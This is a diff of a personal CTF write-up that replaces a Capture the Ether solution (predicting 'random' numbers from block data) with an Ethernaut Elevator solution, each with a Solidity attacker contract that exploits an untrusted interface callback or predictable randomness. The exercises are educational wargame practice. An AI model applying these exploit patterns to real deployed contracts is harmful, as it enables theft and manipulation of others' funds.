@@ -1,24 +1,37 @@
-# Guess the random number Capturetheether
+# Elevator Ethernaut
 
 ## Goals
 
-=> Guess the fairly random number
+=> Reach the top of the building
 
-- There is nop randomness since you can get the Blocknumber & the Blockhash + the timestamp on etherscan and you just need to `abi.encodePacked()` both of those values then you can copy the rest of the function in the constructor, the blockHash were looked up on etherscan aswell as the timestamp and stored in variables for readability reasons, the contract should look like this:
+### Hints
+
+- Sometimes solidity is not good at keeping promises.
+- This Elevator expects to be used from a Building.
+
+- So when looking at the goTo function you see you need to fullfill two conditions at first `building.isLastFloor(_floor)` needs to return false to get into the if case then `building.isLastFloor(_floor)` needs to return true to assign the value true to `top` all of this needs to be called by a "building" so I made a contract that takes the elevator contract address as input and implements the Building interface, from that contract I can call the `elevator.goTo()` with an arbitrary uint, which then calls back to my hack contract which will set the number to 0 (my floorCounter) which then gets increased by one `floorCounter++;`, the 0 gets evaluated to false through my ternary operator, the second time `building.isLastFloor(_floor)` is getting called we assign the now increased floorCounter as the new number so now it will return true thus top = true
+
+### Attacker Contract
 
 ```solidity
 contract Hack {
-    bytes32 public previousBlockHash =
-        0xaf522205a688dbca66076fb9018238a615472ee70c411ecb9e882f77d874ad40;
-    uint public previousTimestamp = 1678819296000;
+    Elevator public elevator;
+    Building public building;
+    uint private floorCounter;
 
-    function guessNum() external view returns (uint8) {
-        return
-            uint8(
-                keccak256(
-                    abi.encodePacked(previousBlockHash, previousTimestamp)
-                )
-            );
+    constructor(address _elevatorAddress) {
+        building = Building(address(this));
+        elevator = Elevator(_elevatorAddress);
+    }
+
+    function isLastFloor(uint _floor) external returns (bool) {
+        _floor = floorCounter;
+        floorCounter++;
+        return _floor == 0 ? false : true;
+    }
+
+    function attack() external {
+        elevator.goTo(1234);
     }
 }
 ```
